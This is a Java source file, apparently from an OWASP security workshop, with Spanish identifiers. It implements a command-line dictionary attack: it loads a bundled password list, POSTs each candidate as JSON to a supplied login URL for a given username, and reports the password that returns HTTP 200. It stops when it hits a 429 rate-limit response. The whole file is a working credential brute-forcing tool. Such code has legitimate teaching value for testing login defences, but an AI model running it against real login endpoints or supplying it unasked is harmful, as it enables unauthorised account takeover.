package taller.owasp.attacks;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;

public class DictionaryAttack {

    private final HttpClient cliente = HttpClient.newHttpClient();

    public List<String> cargarContraseñas() throws Exception {

        List<String> contraseñas = new ArrayList<>();

        InputStream archivo = getClass()
                .getClassLoader()
                .getResourceAsStream("attacks/passwords.txt");

        if (archivo == null) {
            throw new Exception("No se encontró el archivo de contraseñas");
        }

        try (BufferedReader lector = new BufferedReader(
                new InputStreamReader(archivo, StandardCharsets.UTF_8))) {

            String linea;

            while ((linea = lector.readLine()) != null) {
                if (!linea.isBlank()) {
                    contraseñas.add(linea.trim());
                }
            }
        }

        return contraseñas;
    }

    public void probarCarga() throws Exception {
        List<String> contraseñas = cargarContraseñas();

        System.out.println("Total de contraseñas cargadas: " + contraseñas.size());
        System.out.println("Contraseña en posición 37: " + contraseñas.get(36));
    }

    public void ejecutarAtaque(String url, String usuario) throws Exception {

        List<String> contraseñas = cargarContraseñas();

        int intento = 0;

        for (String contraseña : contraseñas) {

            intento++;

            String json = """
                    {
                        "username": "%s",
                        "password": "%s"
                    }
                    """.formatted(usuario, contraseña);

            HttpRequest peticion = HttpRequest.newBuilder()
                    .uri(URI.create(url))
                    .header("Content-Type", "application/json")
                    .POST(HttpRequest.BodyPublishers.ofString(json))
                    .build();

            HttpResponse<String> respuesta = cliente.send(
                    peticion,
                    HttpResponse.BodyHandlers.ofString()
            );

            if (respuesta.statusCode() == 200) {
                System.out.println("[✓] Contraseña encontrada: "
                        + contraseña + " (intento " + intento + ")");
                return;
            }

            if (respuesta.statusCode() == 429) {
                System.out.println("[✗] Bloqueado: 429 en el intento " + intento);
                return;
            }

            if (respuesta.statusCode() != 401) {
                System.out.println("[!] Respuesta inesperada: HTTP "
                        + respuesta.statusCode());
                return;
            }
        }

        System.out.println("[✗] No se encontró la contraseña.");
    }

    public static void main(String[] args) throws Exception {

        if (args.length != 2) {
            System.out.println(
                    "Uso: DictionaryAttack <URL_LOGIN> <USUARIO>"
            );
            return;
        }

        DictionaryAttack ataque = new DictionaryAttack();
        ataque.ejecutarAtaque(args[0], args[1]);
    }
}